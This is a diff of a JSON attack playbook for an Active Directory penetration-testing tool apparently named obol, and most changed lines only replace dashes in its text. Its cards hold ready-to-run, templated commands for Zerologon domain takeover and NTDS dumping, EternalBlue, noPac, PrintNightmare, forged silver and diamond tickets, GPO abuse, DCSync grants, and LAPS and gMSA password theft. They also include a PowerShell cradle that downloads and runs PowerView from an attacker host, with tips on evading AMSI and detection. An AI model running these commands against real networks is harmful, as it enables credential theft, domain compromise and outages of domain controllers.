-   "hypothesis": "Group Managed Service Accounts use long, random passwords that AD manages — but the PrincipalsAllowedToRetrieveManagedPassword property governs who may READ the current password blob. If a group you can join (or already belong to) appears there, the gMSA password is yours: no cracking, no coercion. BloodHound depicts this as ReadGMSAPassword edges; when it shows none, query the attribute directly (the Haze-style pattern).",
+   "hypothesis": "Group Managed Service Accounts use long, random passwords that AD manages, but the PrincipalsAllowedToRetrieveManagedPassword property governs who may READ the current password blob. If a group you can join (or already belong to) appears there, the gMSA password is yours: no cracking, no coercion. BloodHound depicts this as ReadGMSAPassword edges; when it shows none, query the attribute directly (the Haze-style pattern).",
    "tool": "bloodyAD",
    "tools": [
     "bloodyAD"
@@ -1988,7 +1988,7 @@
    ],
    "priority": 88,
    "proves": "produces an NT hash for the gMSA account (pass-the-hash and Kerberos material)",
-   "does_not_prove": "a validated credential or access — the hash is only authentication material until it authenticates to a service (it feeds ticket-reuse and PtH)",
+   "does_not_prove": "a validated credential or access, the hash is only authentication material until it authenticates to a service (it feeds ticket-reuse and PtH)",
    "report": {
     "finding": "gMSA Password Readable by Non-Admin Principal",
     "severity": "critical"
@@ -2013,7 +2013,7 @@
   {
    "id": "laps-read",
    "title": "LAPS Local Admin Password Read",
-   "hypothesis": "LAPS keeps every machine's local admin password in a computer attribute (ms-Mcs-AdmPwd / msLAPS-Password). Read rights are delegated out — often to helpdesk or workstation-admin groups you can slip into. A single attribute read equals local admin on that host, and in labs the local-admin passwords get reused everywhere.",
+   "hypothesis": "LAPS keeps every machine's local admin password in a computer attribute (ms-Mcs-AdmPwd / msLAPS-Password). Read rights are delegated out, often to helpdesk or workstation-admin groups you can slip into. A single attribute read equals local admin on that host, and in labs the local-admin passwords get reused everywhere.",
    "tool": "nxc",
    "tools": [
     "nxc"
@@ -2033,7 +2033,7 @@
    ],
    "priority": 92,
    "proves": "yields a candidate local-admin password for the host",
-   "does_not_prove": "access — reading the LAPS password is not the same as logging in with it, and it says nothing about the password being reused elsewhere until you test that",
+   "does_not_prove": "access, reading the LAPS password is not the same as logging in with it, and it says nothing about the password being reused elsewhere until you test that",
    "report": {
     "finding": "LAPS Passwords Readable by Non-Admin",
     "severity": "high"
@@ -2050,14 +2050,14 @@
     {
      "tool": "sh",
      "run": "Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Select-Object Name,ms-Mcs-AdmPwd",
-     "note": "The PowerShell form on a domain-joined host. This is the legacy LAPS attribute; Windows LAPS uses msLAPS-Password (encrypted — decrypting it needs the LAPS PowerShell module or laps.py)."
+     "note": "The PowerShell form on a domain-joined host. This is the legacy LAPS attribute; Windows LAPS uses msLAPS-Password (encrypted, decrypting it needs the LAPS PowerShell module or laps.py)."
     }
    ]
   },
   {
    "id": "ticket-reuse",
    "title": "Pass-the-Ticket / Overpass-the-Hash",
-   "hypothesis": "Stolen or forged Kerberos tickets (.kirbi or ccache) function without knowing any password — you ARE that principal until they expire. On Windows, Rubeus injects tickets into the session; on Linux, aim KRB5CCNAME at the ccache file and impacket -k handles the rest. On top of that, an NTLM hash becomes a TGT through overpass-the-hash (Rubeus asktgt or getTGT with -hashes), giving you Kerberos in a spot where only NTLM was on hand.",
+   "hypothesis": "Stolen or forged Kerberos tickets (.kirbi or ccache) function without knowing any password, you ARE that principal until they expire. On Windows, Rubeus injects tickets into the session; on Linux, aim KRB5CCNAME at the ccache file and impacket -k handles the rest. On top of that, an NTLM hash becomes a TGT through overpass-the-hash (Rubeus asktgt or getTGT with -hashes), giving you Kerberos in a spot where only NTLM was on hand.",
    "tool": "rubeus",
    "tools": [
     "rubeus",
@@ -2082,7 +2082,7 @@
    ],
    "priority": 92,
    "proves": "produces administrative access and lateral.movement",
-   "does_not_prove": "administrative access on this host or context — not control of the domain unless that is demonstrated on its own",
+   "does_not_prove": "administrative access on this host or context, not control of the domain unless that is demonstrated on its own",
    "report": {
     "finding": "Kerberos Ticket Theft and Reuse",
     "severity": "critical"
@@ -2111,7 +2111,7 @@
   {
    "id": "powerview-enum",
    "title": "PowerView Enumeration (from a Windows Foothold)",
-   "hypothesis": "Once you are ON a domain-joined Windows machine, PowerView delivers deep AD recon from the inside with no additional privileges: users, groups, computers, SPN accounts (kerberoast targets), sessions, local-admin mapping, share hunting. It answers, interactively, the same questions the BloodHound graph poses. Load it into memory, then work through the questions below in sequence — each one yields a named, actionable list.",
+   "hypothesis": "Once you are ON a domain-joined Windows machine, PowerView delivers deep AD recon from the inside with no additional privileges: users, groups, computers, SPN accounts (kerberoast targets), sessions, local-admin mapping, share hunting. It answers, interactively, the same questions the BloodHound graph poses. Load it into memory, then work through the questions below in sequence, each one yields a named, actionable list.",
    "tool": "powershell",
    "tools": [
     "powershell"
@@ -2133,7 +2133,7 @@
    ],
    "priority": 84,
    "proves": "produces attack paths, object-control paths, and a domain user list",
-   "does_not_prove": "context and enumeration only — no access, credential, or privilege",
+   "does_not_prove": "context and enumeration only, no access, credential, or privilege",
    "report": {
     "finding": "",
     "severity": "informational"
@@ -2145,7 +2145,7 @@
     {
      "tool": "powershell",
      "run": "IEX(New-Object Net.WebClient).downloadString('http://{{lhost}}:8000/PowerView.ps1')",
-     "note": "An in-memory load from your HTTP server. The offline/file route: Import-Module .\\PowerView.ps1 (run powershell -ep bypass beforehand). AMSI caveat: cleartext download cradles get caught on current systems — when blocked, switch to the .NET/ADSI card (ad-psdotnet-enum)."
+     "note": "An in-memory load from your HTTP server. The offline/file route: Import-Module .\\PowerView.ps1 (run powershell -ep bypass beforehand). AMSI caveat: cleartext download cradles get caught on current systems, when blocked, switch to the .NET/ADSI card (ad-psdotnet-enum)."
     },
     {
      "tool": "powershell",
@@ -2160,27 +2160,27 @@
     {
      "tool": "powershell",
      "run": "Get-NetGroup | select cn",
-     "note": "Every group. Follow up with Get-NetGroup \"Sales Department\" | select member for membership — nested groups appear as DNs, so trace them down a level."
+     "note": "Every group. Follow up with Get-NetGroup \"Sales Department\" | select member for membership, nested groups appear as DNs, so trace them down a level."
     },
     {
      "tool": "powershell",
      "run": "Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion",
-     "note": "Every computer with its OS and build — the oldest OS is usually the easiest mark, and the build numbers feed patch-gap analysis."
+     "note": "Every computer with its OS and build, the oldest OS is usually the easiest mark, and the build numbers feed patch-gap analysis."
     },
     {
      "tool": "powershell",
      "run": "Get-NetUser -SPN | select samaccountname,serviceprincipalname",
-     "note": "Kerberoast targets from within — service accounts carrying SPNs. It is the same result GetUserSPNs returns from outside; the SPN itself names the service and host (resolve it with nslookup)."
+     "note": "Kerberoast targets from within, service accounts carrying SPNs. It is the same result GetUserSPNs returns from outside; the SPN itself names the service and host (resolve it with nslookup)."
     },
     {
      "tool": "powershell",
      "run": "Find-LocalAdminAccess",
-     "note": "Where does YOUR present user hold local admin? The classic lateral-movement oracle. On large domains it runs for minutes — let it finish."
+     "note": "Where does YOUR present user hold local admin? The classic lateral-movement oracle. On large domains it runs for minutes, let it finish."
     },
     {
      "tool": "powershell",
      "run": "Get-NetSession -ComputerName {{target}}",
-     "note": "Who is logged in where (NetSessionEnum). Heads-up: recent Windows (10 1709+/11, Server 2019+) limits this to admins — an Access Denied is the OS talking, not your setup. Older hosts still reply."
+     "note": "Who is logged in where (NetSessionEnum). Heads-up: recent Windows (10 1709+/11, Server 2019+) limits this to admins, an Access Denied is the OS talking, not your setup. Older hosts still reply."
     },
     {
      "tool": "powershell",
@@ -2192,7 +2192,7 @@
   {
    "id": "ad-legacy-enum",
    "title": "AD Enumeration with Built-In Windows Tools",
-   "hypothesis": "No uploads, no AMSI, no signatures: net.exe, setspn, and nltest come with Windows and cover most first-pass AD questions — users, groups, group membership, SPNs, DCs, password policy. On a brand-new Windows foothold these fill your first five minutes, and they run from any domain-joined context, even tightly monitored ones. Prefer RDP over WinRM when you can: PowerShell Remoting sessions hit the Kerberos double-hop problem and cannot always reach the DC, whereas an RDP session has no such restriction.",
+   "hypothesis": "No uploads, no AMSI, no signatures: net.exe, setspn, and nltest come with Windows and cover most first-pass AD questions, users, groups, group membership, SPNs, DCs, password policy. On a brand-new Windows foothold these fill your first five minutes, and they run from any domain-joined context, even tightly monitored ones. Prefer RDP over WinRM when you can: PowerShell Remoting sessions hit the Kerberos double-hop problem and cannot always reach the DC, whereas an RDP session has no such restriction.",
    "tool": "xfreerdp",
    "tools": [
     "xfreerdp",
@@ -2215,7 +2215,7 @@
    ],
    "priority": 84,
    "proves": "produces a domain user list and attack paths",
-   "does_not_prove": "context and enumeration only — no access, credential, or privilege",
+   "does_not_prove": "context and enumeration only, no access, credential, or privilege",
    "report": {
     "finding": "",
     "severity": "informational"
@@ -2225,22 +2225,22 @@
     {
      "tool": "xfreerdp",
      "run": "xfreerdp /v:{{target}} /u:{{user}} /p:'{{password}}' /d:{{domain}} /cert:ignore +clipboard /dynamic-resolution",
-     "note": "Grab an actual desktop first. Favor RDP over WinRM for enumeration — WinRM runs into the Kerberos double-hop problem (your session cannot re-authenticate to the DC for certain queries). /cert:ignore suppresses prompts."
+     "note": "Grab an actual desktop first. Favor RDP over WinRM for enumeration, WinRM runs into the Kerberos double-hop problem (your session cannot re-authenticate to the DC for certain queries). /cert:ignore suppresses prompts."
     },
     {
      "tool": "cmd",
      "run": "net user /domain",
-     "note": "All domain users. For per-user detail: net user {{user}} /domain — group memberships, last logon, password age, account flags."
+     "note": "All domain users. For per-user detail: net user {{user}} /domain, group memberships, last logon, password age, account flags."
     },
     {
      "tool": "cmd",
      "run": "net group /domain",
-     "note": "All domain groups. For membership: net group \"Domain Admins\" /domain — put multiword names in quotes. net localgroup administrators on a given host lists its local admins."
+     "note": "All domain groups. For membership: net group \"Domain Admins\" /domain, put multiword names in quotes. net localgroup administrators on a given host lists its local admins."
     },
     {
      "tool": "cmd",
      "run": "net accounts /domain",
-     "note": "The domain password and lockout policy — MANDATORY reading before any spraying (see password-spray). One under the lockout threshold is your budget."
+     "note": "The domain password and lockout policy, MANDATORY reading before any spraying (see password-spray). One under the lockout threshold is your budget."
     },
     {
      "tool": "cmd",
@@ -2279,7 +2279,7 @@
    ],
    "priority": 84,
    "proves": "produces a domain user list and attack paths",
-   "does_not_prove": "context and enumeration only — no access, credential, or privilege",
+   "does_not_prove": "context and enumeration only, no access, credential, or privilege",
    "report": {
     "finding": "",
     "severity": "informational"
@@ -2294,7 +2294,7 @@
     {
      "tool": "powershell",
      "run": "[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()",
-     "note": "The domain object: forest, DCs, and PdcRoleOwner — the DC holding the freshest data. $PDC = ...GetCurrentDomain().PdcRoleOwner.Name"
+     "note": "The domain object: forest, DCs, and PdcRoleOwner, the DC holding the freshest data. $PDC = ...GetCurrentDomain().PdcRoleOwner.Name"
     },
     {
      "tool": "powershell",
@@ -2304,7 +2304,7 @@
     {
      "tool": "powershell",
      "run": "function LDAPSearch { param([string]$LDAPQuery) $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name; $DistinguishedName = ([adsi]\"''\").distinguishedName; $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry(\"LDAP://$PDC/$DistinguishedName\"); $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery); return $DirectorySearcher.FindAll() }",
-     "note": "The reusable function — paste this entire line, or save it as function.ps1 and Import-Module it. Each query below is a single LDAPSearch call."
+     "note": "The reusable function, paste this entire line, or save it as function.ps1 and Import-Module it. Each query below is a single LDAPSearch call."
     },
     {
      "tool": "powershell",
@@ -2350,7 +2350,7 @@
    ],
    "priority": 92,
    "proves": "produces object-control paths and administrative access",
-   "does_not_prove": "administrative access on this host or context — not control of the domain unless that is demonstrated on its own",
+   "does_not_prove": "administrative access on this host or context, not control of the domain unless that is demonstrated on its own",
    "report": {
     "finding": "Excessive AD Object Permissions (GenericAll/WriteDACL)",
     "severity": "high"
@@ -2373,12 +2373,12 @@
     {
      "tool": "powershell",
      "run": "Convert-SidToName S-1-5-21-...-1104",
-     "note": "Convert SecurityIdentifier SIDs into readable names. Do it in bulk: \"SID1\",\"SID2\" | Convert-SidToName. Domain Admins, Account Operators, and SYSTEM are expected — a plain user is the red flag."
+     "note": "Convert SecurityIdentifier SIDs into readable names. Do it in bulk: \"SID1\",\"SID2\" | Convert-SidToName. Domain Admins, Account Operators, and SYSTEM are expected, a plain user is the red flag."
     },
     {
      "tool": "cmd",
      "run": "net group \"{{group}}\" {{user}} /add /domain",
-     "note": "Exploit GenericAll on a group: add yourself. Confirm with Get-NetGroup \"{{group}}\" | select member. CLEAN UP AFTERWARD: net group \"{{group}}\" {{user}} /del /domain — and log both actions in your notes."
+     "note": "Exploit GenericAll on a group: add yourself. Confirm with Get-NetGroup \"{{group}}\" | select member. CLEAN UP AFTERWARD: net group \"{{group}}\" {{user}} /del /domain, and log both actions in your notes."
     },
     {
      "tool": "powershell",
@@ -2388,14 +2388,14 @@
     {
      "tool": "powershell",
      "run": "Add-DomainObjectAcl -TargetIdentity '{{basedn}}' -PrincipalIdentity {{user}} -Rights DCSync -Verbose",
-     "note": "WriteDACL on the domain (e.g. via Exchange Windows Permissions) → grant your account DCSync, then run the `dcsync` card. NOTE: this is the MODERN PowerView cmdlet — the walkthrough's `Add-ObjectACL` is obsolete and errors with 'The term Add-ObjectACL is not recognized' on current PowerView. Prefer the remote bloodyAD path (`bloodyad-acl` card) to skip the PowerView upload + dot-source dance entirely."
+     "note": "WriteDACL on the domain (e.g. via Exchange Windows Permissions) → grant your account DCSync, then run the `dcsync` card. NOTE: this is the MODERN PowerView cmdlet, the walkthrough's `Add-ObjectACL` is obsolete and errors with 'The term Add-ObjectACL is not recognized' on current PowerView. Prefer the remote bloodyAD path (`bloodyad-acl` card) to skip the PowerView upload + dot-source dance entirely."
     }
    ]
   },
   {
    "id": "zerologon-exploit",
-   "title": "Zerologon Exploit (CVE-2020-1472) — DC Takeover + Restore",
-   "hypothesis": "A confirmed Zerologon DC can be fully compromised WITHOUT credentials: reset the DC machine-account password to empty, then DRSUAPI-replicate the whole domain (krbtgt included) with a null machine login. This is DESTRUCTIVE — an emptied machine password breaks Netlogon/replication until it is restored — so obol's auto-fired command is the self-restoring sequence: empty the password, dump NTDS, then reinstall the ORIGINAL machine hash pulled straight from that dump. Never leave a DC with an empty machine password; the restore is part of the exploit, not an afterthought.",
+   "title": "Zerologon Exploit (CVE-2020-1472), DC Takeover + Restore",
+   "hypothesis": "A confirmed Zerologon DC can be fully compromised WITHOUT credentials: reset the DC machine-account password to empty, then DRSUAPI-replicate the whole domain (krbtgt included) with a null machine login. This is DESTRUCTIVE (an emptied machine password breaks Netlogon/replication until it is restored) so obol's auto-fired command is the self-restoring sequence: empty the password, dump NTDS, then reinstall the ORIGINAL machine hash pulled straight from that dump. Never leave a DC with an empty machine password; the restore is part of the exploit, not an afterthought.",
    "tool": "sh",
    "tools": [
     "set_empty_pw.py",
@@ -2421,7 +2421,7 @@
    "autonomy": "manual",
    "priority": 94,
    "proves": "resets the DC machine account, replicates NTDS secrets (krbtgt among them), then restores the original machine password from the dump",
-   "does_not_prove": "a healthy domain if the restore step failed — always confirm the DC machine password is back (a login as the machine account, or replication working) before you walk away",
+   "does_not_prove": "a healthy domain if the restore step failed, always confirm the DC machine password is back (a login as the machine account, or replication working) before you walk away",
    "report": {
     "finding": "Zerologon Domain Takeover (CVE-2020-1472)",
     "severity": "critical"
@@ -2445,7 +2445,7 @@
     {
      "tool": "impacket-secretsdump",
      "run": "impacket-secretsdump -no-pass -just-dc '{{domain}}/{{dc_account}}@{{target}}'",
-     "note": "Step 2: replicate the domain with the emptied machine login. SAVE the {{dc_account}} line — its NT hash (field 4) is what step 3 restores."
+     "note": "Step 2: replicate the domain with the emptied machine login. SAVE the {{dc_account}} line, its NT hash (field 4) is what step 3 restores."
     },
     {
      "tool": "reinstall_original_pw.py",
@@ -2457,7 +2457,7 @@
   {
    "id": "coerce-auth",
    "title": "Authentication Coercion (PetitPotam / PrinterBug / DFSCoerce)",
-   "hypothesis": "A DC or server can be forced to authenticate to a host you control over MS-EFSR (PetitPotam), MS-RPRN (PrinterBug), or MS-DFSNM (DFSCoerce). That coerced machine authentication is the trigger the relay lane needs: relay it to LDAP for RBCD, to the ADCS web endpoint for ESC8, or capture the DC's TGT on an unconstrained-delegation host. obol already ships Responder, ntlmrelayx, and mitm6 — coercion is the missing spark.",
+   "hypothesis": "A DC or server can be forced to authenticate to a host you control over MS-EFSR (PetitPotam), MS-RPRN (PrinterBug), or MS-DFSNM (DFSCoerce). That coerced machine authentication is the trigger the relay lane needs: relay it to LDAP for RBCD, to the ADCS web endpoint for ESC8, or capture the DC's TGT on an unconstrained-delegation host. obol already ships Responder, ntlmrelayx, and mitm6, coercion is the missing spark.",
    "tool": "coercer",
    "tools": [
     "coercer",
@@ -2484,8 +2484,8 @@
    ],
    "autonomy": "approve",
    "priority": 82,
-   "proves": "forces DC/server authentication to an attacker listener — a NetNTLM capture or a live relay trigger",
-   "does_not_prove": "access — a coerced authentication is relayable/crackable material, not a credential or a foothold until it is relayed or cracked",
+   "proves": "forces DC/server authentication to an attacker listener, a NetNTLM capture or a live relay trigger",
+   "does_not_prove": "access, a coerced authentication is relayable/crackable material, not a credential or a foothold until it is relayed or cracked",
    "report": {
     "finding": "Authentication Coercion (MS-EFSR/MS-RPRN/MS-DFSNM)",
     "severity": "high"
@@ -2516,7 +2516,7 @@
   {
    "id": "unconstrained-delegation",
    "title": "Unconstrained Delegation TGT Capture",
-   "hypothesis": "A host trusted for unconstrained delegation caches the TGT of every account that authenticates to it. Own such a host, coerce the DC to authenticate to it, and monitor for the DC's own TGT — then reuse it to DCSync. This is the delegation track's most powerful branch and the natural partner to coercion.",
+   "hypothesis": "A host trusted for unconstrained delegation caches the TGT of every account that authenticates to it. Own such a host, coerce the DC to authenticate to it, and monitor for the DC's own TGT, then reuse it to DCSync. This is the delegation track's most powerful branch and the natural partner to coercion.",
    "tool": "rubeus",
    "tools": [
     "rubeus",
@@ -2542,7 +2542,7 @@
    "autonomy": "approve",
    "priority": 88,
    "proves": "captures a privileged TGT (the DC's, when coerced) on an unconstrained-delegation host you control",
-   "does_not_prove": "domain control on its own — the captured ticket must be reused (DCSync / S4U) to prove impact",
+   "does_not_prove": "domain control on its own, the captured ticket must be reused (DCSync / S4U) to prove impact",
    "report": {
     "finding": "Unconstrained Delegation Abuse",
     "severity": "critical"
@@ -2567,7 +2567,7 @@
   {
    "id": "silver-ticket",
    "title": "Silver Ticket (Forged Service Ticket)",
-   "hypothesis": "The NT hash of a SERVICE account (or a computer account) lets you forge a service ticket (TGS) for that service as any user — no DC contact, no krbtgt needed. Quieter than a golden ticket and often enough: a machine-account hash forges a CIFS/HOST ticket to own that host as Administrator.",
+   "hypothesis": "The NT hash of a SERVICE account (or a computer account) lets you forge a service ticket (TGS) for that service as any user, no DC contact, no krbtgt needed. Quieter than a golden ticket and often enough: a machine-account hash forges a CIFS/HOST ticket to own that host as Administrator.",
    "tool": "impacket-ticketer",
    "tools": [
     "impacket-ticketer",
@@ -2591,7 +2591,7 @@
    "autonomy": "approve",
    "priority": 84,
    "proves": "forges a service ticket that grants administrative access to the target service",
-   "does_not_prove": "domain-wide control — a silver ticket is scoped to one service on one host",
+   "does_not_prove": "domain-wide control, a silver ticket is scoped to one service on one host",
    "report": {
     "finding": "Kerberos Silver Ticket Forgery",
     "severity": "high"
@@ -2616,7 +2616,7 @@
   {
    "id": "diamond-ticket",
    "title": "Diamond Ticket (Modified TGT)",
-   "hypothesis": "With the krbtgt hash, a DIAMOND ticket modifies a real, DC-issued TGT rather than forging one wholesale (a golden ticket). Because it starts from a legitimate TGT its fields are consistent and it evades the anomaly detections that catch golden tickets — the stealthier domain-persistence primitive.",
+   "hypothesis": "With the krbtgt hash, a DIAMOND ticket modifies a real, DC-issued TGT rather than forging one wholesale (a golden ticket). Because it starts from a legitimate TGT its fields are consistent and it evades the anomaly detections that catch golden tickets, the stealthier domain-persistence primitive.",
    "tool": "rubeus",
    "tools": [
     "rubeus",
@@ -2639,7 +2639,7 @@
    "autonomy": "approve",
    "priority": 90,
    "proves": "mints a modified-but-valid TGT with arbitrary group membership (stealthy persistence)",
-   "does_not_prove": "a way in — like the golden ticket it is post-compromise persistence",
+   "does_not_prove": "a way in, like the golden ticket it is post-compromise persistence",
    "report": {
     "finding": "Domain Persistence via Diamond Ticket",
     "severity": "critical"
@@ -2659,7 +2659,7 @@
   {
    "id": "gpo-abuse",
    "title": "Group Policy Object Abuse",
-   "hypothesis": "Write access to a GPO — or to an OU it is linked to — is code execution as SYSTEM on every computer in scope: add an immediate scheduled task or a local-admin membership through the policy and it deploys on the next refresh. BloodHound flags the edge (GenericWrite/WriteDACL on a GPO); this is its cash-in.",
+   "hypothesis": "Write access to a GPO (or to an OU it is linked to) is code execution as SYSTEM on every computer in scope: add an immediate scheduled task or a local-admin membership through the policy and it deploys on the next refresh. BloodHound flags the edge (GenericWrite/WriteDACL on a GPO); this is its cash-in.",
    "tool": "pygpoabuse",
    "tools": [
     "pygpoabuse",
@@ -2683,7 +2683,7 @@
    "autonomy": "approve",
    "priority": 86,
    "proves": "turns write control over a GPO into SYSTEM execution on its linked computers",
-   "does_not_prove": "immediate access — execution lands on the target's next group-policy refresh",
+   "does_not_prove": "immediate access, execution lands on the target's next group-policy refresh",
    "report": {
     "finding": "Writable GPO Abuse",
     "severity": "critical"
@@ -2701,7 +2701,7 @@
     {
      "tool": "bloodyAD",
      "run": "bloodyAD --host {{target}} -d {{domain}} -u {{user}} -p '{{password}}' get writable --detail",
-     "note": "List every object this account can write to — the groupPolicyContainer entries are the writable GPOs, and their cn is the {{gpo_id}} the pygpoabuse command needs. netexec has NO gpo_privesc module (it aborts); bloodyAD is the real, runnable enumerator. BloodHound's 'GPO' edges show the same on the Domain tab."
+     "note": "List every object this account can write to, the groupPolicyContainer entries are the writable GPOs, and their cn is the {{gpo_id}} the pygpoabuse command needs. netexec has NO gpo_privesc module (it aborts); bloodyAD is the real, runnable enumerator. BloodHound's 'GPO' edges show the same on the Domain tab."
     }
    ]
   },
@@ -2784,7 +2784,7 @@
    "autonomy": "approve",
    "priority": 88,
    "proves": "injects a cross-domain privileged SID to escalate across a forest trust",
-   "does_not_prove": "anything where SID filtering is enforced — a filtered trust drops the extra SID",
+   "does_not_prove": "anything where SID filtering is enforced, a filtered trust drops the extra SID",
    "report": {
     "finding": "SID History / Cross-Forest Trust Abuse",
     "severity": "critical"
@@ -2808,8 +2808,8 @@
   },
   {
    "id": "eternalblue",
-   "title": "EternalBlue — MS17-010 SMB Remote Code Execution (CVE-2017-0144)",
-   "hypothesis": "An unpatched SMBv1 server (MS17-010) can be exploited for remote code execution as SYSTEM without credentials. Once nmap's smb-vuln-ms17-010 flags the host VULNERABLE, a scripted public exploit (or the Metasploit module) lands a SYSTEM shell directly. On the exam, prefer the scripted exploit — Metasploit is limited to a single target.",
+   "title": "EternalBlue, MS17-010 SMB Remote Code Execution (CVE-2017-0144)",
+   "hypothesis": "An unpatched SMBv1 server (MS17-010) can be exploited for remote code execution as SYSTEM without credentials. Once nmap's smb-vuln-ms17-010 flags the host VULNERABLE, a scripted public exploit (or the Metasploit module) lands a SYSTEM shell directly. On the exam, prefer the scripted exploit, Metasploit is limited to a single target.",
    "tool": "metasploit",
    "tools": [
     "metasploit",
@@ -2829,7 +2829,7 @@
    "autonomy": "manual",
    "priority": 88,
    "proves": "remote code execution as NT AUTHORITY\\SYSTEM on an MS17-010-vulnerable host",
-   "does_not_prove": "a stable shell on the first try — EternalBlue can crash the target; know the restart/revert behaviour before firing",
+   "does_not_prove": "a stable shell on the first try, EternalBlue can crash the target; know the restart/revert behaviour before firing",
    "report": {
     "finding": "MS17-010 EternalBlue Remote Code Execution",
     "severity": "critical"
@@ -2847,19 +2847,19 @@
     {
      "tool": "AutoBlue-MS17-010",
      "run": "python3 eternalblue_exploit7.py {{target}} shellcode/sc_x64.bin",
-     "note": "Scripted public exploit — no Metasploit single-target limit."
+     "note": "Scripted public exploit, no Metasploit single-target limit."
     },
     {
      "tool": "metasploit",
      "run": "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {{target}}; set LHOST {{lhost}}; run'",
-     "note": "Metasploit module — exam-limited to one target."
+     "note": "Metasploit module, exam-limited to one target."
     }
    ]
   },
   {
    "id": "nopac",
    "title": "noPac / sAMAccountName spoofing (CVE-2021-42278 + CVE-2021-42287)",
-   "hypothesis": "On an unpatched DC, any authenticated user can rename a machine account to impersonate a DC and request a ticket as a privileged account — a straight line from a low-priv domain credential to Domain Admin / DCSync. Needs only valid creds and a vulnerable DC.",
+   "hypothesis": "On an unpatched DC, any authenticated user can rename a machine account to impersonate a DC and request a ticket as a privileged account, a straight line from a low-priv domain credential to Domain Admin / DCSync. Needs only valid creds and a vulnerable DC.",
    "tool": "noPac.py",
    "tools": [
     "noPac.py",
@@ -2882,7 +2882,7 @@
    "autonomy": "manual",
    "priority": 80,
    "proves": "a privileged ticket (typically DCSync/SYSTEM on the DC) from a low-priv domain account against an unpatched DC",
-   "does_not_prove": "anything on a patched DC — confirm the CVEs are unpatched (the tool's scan mode) before relying on it",
+   "does_not_prove": "anything on a patched DC, confirm the CVEs are unpatched (the tool's scan mode) before relying on it",
    "report": {
     "finding": "noPac Domain Privilege Escalation (CVE-2021-42278/42287)",
     "severity": "critical"
@@ -2902,7 +2902,7 @@
   {
    "id": "printnightmare",
    "title": "PrintNightmare (CVE-2021-1675 / CVE-2021-34527)",
-   "hypothesis": "The Windows Print Spooler can be abused to load an attacker DLL as SYSTEM — remotely with any domain creds against a host running Spooler, or locally for privilege escalation. A reliable path to SYSTEM on unpatched hosts.",
+   "hypothesis": "The Windows Print Spooler can be abused to load an attacker DLL as SYSTEM, remotely with any domain creds against a host running Spooler, or locally for privilege escalation. A reliable path to SYSTEM on unpatched hosts.",
    "tool": "impacket",
    "tools": [
     "CVE-2021-1675.py",
@@ -2925,7 +2925,7 @@
    "autonomy": "manual",
    "priority": 76,
    "proves": "SYSTEM code execution via the Print Spooler on an unpatched host",
-   "does_not_prove": "success where the Spooler is disabled or the host is patched — check the Spooler is reachable first",
+   "does_not_prove": "success where the Spooler is disabled or the host is patched, check the Spooler is reachable first",
    "report": {
     "finding": "PrintNightmare Spooler RCE/LPE (CVE-2021-34527)",
     "severity": "critical"
@@ -2950,7 +2950,7 @@
   {
    "id": "ms14-068",
    "title": "MS14-068 Kerberos PAC Forgery (CVE-2014-6324)",
-   "hypothesis": "On a DC missing the MS14-068 patch, a standard domain user can forge a Kerberos PAC claiming Domain Admin membership, yielding a golden-ticket-like TGT — low-priv creds straight to domain compromise. Legacy, but still seen on old lab DCs.",
+   "hypothesis": "On a DC missing the MS14-068 patch, a standard domain user can forge a Kerberos PAC claiming Domain Admin membership, yielding a golden-ticket-like TGT, low-priv creds straight to domain compromise. Legacy, but still seen on old lab DCs.",
    "tool": "impacket-goldenPac",
    "tools": [
     "impacket-goldenPac"
@@ -2972,7 +2972,7 @@
    "autonomy": "manual",
    "priority": 66,
    "proves": "a forged PAC TGT granting Domain Admin on an unpatched (pre-MS14-068) DC",
-   "does_not_prove": "anything on a patched DC — this only lands on legacy hosts",
+   "does_not_prove": "anything on a patched DC, this only lands on legacy hosts",
    "report": {
     "finding": "MS14-068 Kerberos PAC Forgery (CVE-2014-6324)",
     "severity": "critical"
